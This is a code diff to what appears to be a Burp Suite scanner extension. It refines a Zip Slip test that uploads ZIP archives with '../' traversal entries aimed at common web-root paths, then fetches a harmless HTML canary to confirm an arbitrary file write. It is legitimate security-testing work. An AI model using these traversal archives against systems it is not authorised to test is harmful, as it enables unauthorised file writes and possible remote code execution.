@@ -3811,34 +3811,46 @@ trailer <<
         canary_filename = "zipslip_" + canary_tag + ".html"
         canary_content = "<html><body>UploadScannerZipSlipProof-{}</body></html>".format(canary_tag)
 
+        # Parse upload URL path so relative traversal maps to the correct GET URL.
+        # e.g. upload at /app/uploads/ → depth 1 lands at /app/, depth 2 at /
+        brr = injector.get_brr()
+        upload_path = self._helpers.analyzeRequest(brr).getUrl().getPath()
+        path_parts = [p for p in upload_path.split('/') if p]  # ['app', 'uploads']
+
+        # (entry_path, get_url) pairs — get_url is where the canary appears in URL space
         webroot_targets = []
-        for depth in range(1, 8):
-            webroot_targets.append("../" * depth + canary_filename)
+
+        # URL-aware relative targets: ../N levels up from the upload URL (max 3)
+        for depth in range(1, min(len(path_parts) + 1, 4)):
+            entry_path = "../" * depth + canary_filename
+            if depth < len(path_parts):
+                get_url = "/" + "/".join(path_parts[:-depth]) + "/" + canary_filename
+            else:
+                get_url = "/" + canary_filename
+            webroot_targets.append((entry_path, get_url))
+
+        # Absolute-path targets: traverse deep enough to reach common web roots,
+        # then the canary always lands at /<canary_filename> in URL space.
         for depth in range(1, 6):
             prefix = "../" * depth
-            webroot_targets += [
-                prefix + "var/www/html/" + canary_filename,
-                prefix + "srv/www/" + canary_filename,
-                prefix + "usr/share/nginx/html/" + canary_filename,
-                prefix + "var/www/" + canary_filename,
-            ]
+            for subpath in ("var/www/html/", "srv/www/", "usr/share/nginx/html/", "var/www/"):
+                webroot_targets.append((prefix + subpath + canary_filename, "/" + canary_filename))
 
         name_web = "Zip Slip — web root file write confirmed"
         detail_web = ("A crafted ZIP archive was uploaded with a traversal entry '{}' containing a canary HTML file. "
-                      "The file was subsequently retrieved via GET /{}, confirming that the server extracted the "
+                      "The file was subsequently retrieved via GET {}, confirming that the server extracted the "
                       "archive without sanitising entry names and that the file landed in a web-accessible directory. "
                       "This proves arbitrary file write and likely leads to Remote Code Execution. "
                       "See https://github.com/snyk/zip-slip-vulnerability for details.")
 
-        def _try_fetch_canary():
-            brr = injector.get_brr()
-            service = brr.getHttpService()
-            iRequestInfo = self._helpers.analyzeRequest(brr)
+        def _try_fetch_canary(get_url):
+            service = injector.get_brr().getHttpService()
+            iRequestInfo = self._helpers.analyzeRequest(injector.get_brr())
             headers = list(iRequestInfo.getHeaders())[1:]
             clean = [h for h in headers
                      if not any(h.lower().startswith(bh) for bh in BurpExtender.REDL_URL_BAD_HEADERS)]
             clean.append("Accept: text/html,*/*")
-            req = ("GET /" + canary_filename + " HTTP/1.1" + BurpExtender.NEWLINE +
+            req = ("GET " + get_url + " HTTP/1.1" + BurpExtender.NEWLINE +
                    BurpExtender.NEWLINE.join(clean) + BurpExtender.NEWLINE * 2)
             try:
                 attack = self._callbacks.makeHttpRequest(service, req)
@@ -3850,7 +3862,7 @@ trailer <<
             return None
 
         zip_web_types = [('', '.zip', ''), ('', '.zip', 'application/zip')]
-        for entry_path in webroot_targets:
+        for entry_path, get_url in webroot_targets:
             arc = _traversal_zip(entry_path, canary_content)
             tag = entry_path.replace("/", "").replace(".", "").replace("_", "")[-10:]
             basename = self.FILE_START + "ZipSlipWeb" + tag
@@ -3859,9 +3871,9 @@ trailer <<
                 if not req:
                     continue
                 self._make_http_request(injector, req)
-            fetch_rr = _try_fetch_canary()
+            fetch_rr = _try_fetch_canary(get_url)
             if fetch_rr:
-                detail = detail_web.format(entry_path, canary_filename)
+                detail = detail_web.format(entry_path, get_url)
                 issue = self._create_issue_template(injector.get_brr(), name_web, detail, "Certain", "High")
                 issue.httpMessagesPy = [fetch_rr]
                 self._add_scan_issue(issue)
